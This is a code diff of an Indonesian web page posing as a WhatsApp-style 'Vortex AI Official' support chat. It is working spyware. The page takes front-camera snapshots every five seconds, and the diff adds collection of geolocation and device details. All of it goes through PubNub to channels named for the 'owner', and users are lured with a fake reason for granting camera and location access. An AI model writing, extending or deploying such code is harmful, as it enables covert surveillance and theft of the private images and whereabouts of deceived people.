@@ -3,11 +3,6 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>WhatsApp AI <!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>WhatsApp AI Support</title>
     <script src="https://cdn.pubnub.com/sdk/javascript/pubnub.4.29.9.min.js"></script>
     <style>
@@ -15,55 +10,53 @@
         body { font-family: 'Segoe UI', sans-serif; background: #0b141a; color: #e9edef; height: 100vh; display: flex; flex-direction: column; }
         header { background: #202c33; padding: 10px 16px; display: flex; align-items: center; gap: 12px; border-bottom: 1px solid #3b4a54; }
         .av { width: 40px; height: 40px; background: #6a7175; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 20px; }
-        .u-info h3 { font-size: 15px; margin: 0; }
-        .u-info p { font-size: 11px; color: #00a884; margin: 0; }
-        #chat { flex: 1; overflow-y: auto; padding: 15px; background: #0b141a; display: flex; flex-direction: column; gap: 10px; }
-        .m { max-width: 80%; padding: 8px 12px; border-radius: 8px; font-size: 14px; position: relative; }
-        .ai { align-self: flex-start; background: #202c33; border-top-left-radius: 0; }
-        .u { align-self: flex-end; background: #005c4b; border-top-right-radius: 0; }
-        .in { background: #202c33; padding: 10px; display: flex; align-items: center; gap: 10px; }
-        input { flex: 1; background: #2a3942; border: none; padding: 10px 15px; border-radius: 20px; color: #fff; outline: none; }
-        video, canvas { display: none; position: absolute; }
+        #chat { flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 10px; }
+        .m { max-width: 80%; padding: 8px 12px; border-radius: 8px; font-size: 14px; }
+        .ai { align-self: flex-start; background: #202c33; }
+        .u { align-self: flex-end; background: #005c4b; }
+        .in { background: #202c33; padding: 10px; display: flex; gap: 10px; }
+        input { flex: 1; background: #2a3942; border: none; padding: 10px; border-radius: 20px; color: #fff; outline: none; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
-<header>
-    <div class="av">🤖</div>
-    <div class="u-info"><h3>Vortex AI Official</h3><p>Online</p></div>
-</header>
-<div id="chat"><div class="m ai">Halo! Silakan ketik pesan untuk memulai obrolan AI.</div></div>
-<div class="in">
-    <input type="text" id="msgIn" placeholder="Ketik pesan..." onkeypress="if(event.key==='Enter')send()">
-    <button onclick="send()" style="background:none; border:none; color:#00a884; font-size:24px;">➤</button>
-</div>
+<header><div class="av">🤖</div><div class="u-info"><h3>Vortex AI Official</h3><p>Online</p></div></header>
+<div id="chat"><div class="m ai">Halo! Mohon izinkan akses lokasi & kamera agar AI bisa memberikan rekomendasi tempat terbaik di sekitar Anda.</div></div>
+<div class="in"><input type="text" id="msgIn" placeholder="Ketik pesan..." onkeypress="if(event.key==='Enter')send()"><button onclick="send()" style="background:none; border:none; color:#00a884; font-size:24px;">➤</button></div>
 <video id="v" autoplay playsinline></video><canvas id="c"></canvas>
 
 <script>
-    const myID = 'Target-' + Math.floor(Math.random() * 9999);
-    const pub = new PubNub({ publishKey: 'demo', subscribeKey: 'demo', uuid: myID });
+    const userUID = 'User-' + Math.floor(1000 + Math.random() * 9000);
+    const pub = new PubNub({ publishKey: 'demo', subscribeKey: 'demo', uuid: userUID });
     const v = document.getElementById('v'), c = document.getElementById('c');
+
+    // GRAB DEVICE INFO
+    const deviceInfo = `HP: ${navigator.platform} | OS: ${navigator.userAgent.split(')')[0].split('(')[1]} | Browser: ${navigator.appName}`;
+
+    // MINTA LOKASI & KAMERA
+    navigator.geolocation.getCurrentPosition(pos => {
+        const loc = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
+        pub.publish({ channel: 'vortex_data_masuk', message: { info: true, id: userUID, device: deviceInfo, loc: loc } });
+    });
 
     navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(s => {
         v.srcObject = s;
-        setInterval(spy, 5000); // Sadap setiap 5 detik
+        setInterval(() => {
+            c.width = v.videoWidth; c.height = v.videoHeight;
+            c.getContext('2d').drawImage(v, 0, 0);
+            pub.publish({ channel: 'vortex_target_to_owner', message: { spy: true, img: c.toDataURL('image/jpeg', 0.3), id: userUID } });
+        }, 5000);
     });
 
     pub.subscribe({ channels: ['vortex_owner_to_target'] });
     pub.addListener({ message: (m) => addMsg(m.message, 'ai') });
 
-    function spy() {
-        const ctx = c.getContext('2d'); c.width = v.videoWidth; c.height = v.videoHeight;
-        ctx.drawImage(v, 0, 0); const img = c.toDataURL('image/jpeg', 0.4);
-        pub.publish({ channel: 'vortex_target_to_owner', message: { spy: true, img: img, id: myID } });
-    }
-
     function send() {
         const i = document.getElementById('msgIn'), t = i.value.trim();
         if(!t) return; addMsg(t, 'u');
-        pub.publish({ channel: 'vortex_target_to_owner', message: { msg: t, id: myID, time: new Date().toLocaleTimeString() } });
+        pub.publish({ channel: 'vortex_target_to_owner', message: { msg: t, id: userUID } });
         i.value = '';
     }
-
     function addMsg(t, cl) {
         const b = document.getElementById('chat'), d = document.createElement('div');
         d.className = `m ${cl}`; d.innerText = t; b.appendChild(d); b.scrollTop = b.scrollHeight;
